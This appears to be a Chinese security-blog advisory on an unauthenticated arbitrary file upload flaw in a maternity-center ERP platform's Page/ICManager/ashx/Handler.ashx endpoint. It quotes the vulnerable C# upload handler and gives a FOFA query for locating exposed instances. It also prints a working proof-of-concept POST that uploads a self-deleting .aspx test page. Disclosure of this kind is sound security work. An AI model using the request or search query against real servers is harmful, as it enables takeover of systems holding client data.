---
title: "月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-ICManager-rce.html
asset_dir: assets/月子会所erp管理云平台-pageicmanagerashxhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/4 08:35
- 606浏览
- [0评论](#comment)
- 25分钟阅读

深入探索

网络安全课程

漏洞扫描服务

安全认证考试

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/ICManager/ashx/Handler.ashx 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，由于未对上传文件进行任何过滤，攻击者可利用该漏洞上传恶意文件，进而获取服务器控制权。

企业资源规划

# fofa语法

> body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"

# 漏洞分析

直接看其业务实现逻辑

```
public class Handler : IHttpHandler {

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     //拓展名

                string newname = GetNewName(tuozhanming);
                UploadfileURLList += newname + "|";
                string url = System.Configuration.ConfigurationManager.AppSettings["UPLOAD_CONTACT_URL"].ToString();
                //../../UploadBaseFolder/Contact/
                mypost.SaveAs(context.Server.MapPath("../" + url + newname));
                System.Threading.Thread.Sleep(100);

            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);

    }

    public string GetNewName(string name)
    {
        string time = DateTime.Now.ToString("yy-MM-dd");
        string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return newname + new Random().Next(0000000, 9999999) + name;

    }
```

深入探索

Windows安全工具

安全研究工具

恶意软件分析工具

直接上传对文件类型无任何过滤或校验，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

UPLOAD\_CONTACT\_URL 位置在 web.config 设置，一般为

云存储

```
<add key="UPLOAD_CONTACT_URL" value="../../UploadBaseFolder/Contact/" />
```

所以最终上传文件保存路径为 /UploadBaseFolder/Contact/文件名

# 漏洞复现

## POC

```
POST /Page/ICManager/ashx/Handler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="test.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary123--
```

访问上传文件 UploadBaseFolder/Contact/响应文件名

漏洞修复方案

[![月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞](images/img-001-27f15b594bab.webp)](https://image.mrxn.net/c9ef0f2991d54c659999c0043989093a.webp)

成功打印随机GUID字符串并删除自身。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [4.1.POC](#toc-4-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
